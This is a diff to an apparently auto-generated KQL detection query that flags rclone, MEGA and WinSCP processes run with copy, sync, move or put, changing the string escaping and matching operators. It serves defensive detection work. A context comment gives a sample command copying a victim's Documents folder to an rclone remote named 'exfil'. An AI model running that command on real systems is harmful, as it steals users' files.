@@ -5,4 +5,4 @@
 //   rclone copy C:\Users\victim\Documents remote:exfil --transfers 8
 // source: rules/exfiltration/exfiltration-to-cloud-storage.yml  (GENERATED, do not edit by hand)
 Event
-| where (((NewProcessName endswith "\rclone.exe" or NewProcessName endswith "\megacmd.exe" or NewProcessName endswith "\MEGAclient.exe" or NewProcessName endswith "\winscp.com" or NewProcessName endswith "\winscp.exe") and (CommandLine has_any (dynamic(["copy", "sync", "move", "put"])))) or ((OriginalFileName =~ "rclone.exe")))
+| where (((NewProcessName endswith @"\rclone.exe" or NewProcessName endswith @"\megacmd.exe" or NewProcessName endswith @"\MEGAclient.exe" or NewProcessName endswith @"\winscp.com" or NewProcessName endswith @"\winscp.exe") and (CommandLine contains @"copy" or CommandLine contains @"sync" or CommandLine contains @"move" or CommandLine contains @"put")) or ((OriginalFileName =~ @"rclone.exe")))
